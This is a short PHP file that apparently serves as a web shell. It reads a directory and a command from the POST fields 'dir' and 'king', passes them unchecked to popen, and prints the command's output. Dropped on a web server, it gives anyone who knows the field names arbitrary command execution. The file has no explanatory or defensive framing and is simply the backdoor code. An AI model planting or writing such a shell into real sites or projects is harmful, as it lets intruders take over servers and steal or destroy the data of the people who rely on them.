<?php
$curdir = $_POST['dir'];
$curcmd = $_POST['king'];

$curcmd = "cd ".$curdir.";".$curcmd;
$f=popen($curcmd,"r");
while (!feof($f)) {
    $buffer = fgets($f, 4096);
    $string .= $buffer;
}
pclose($f);
echo htmlspecialchars($string);
   
?>

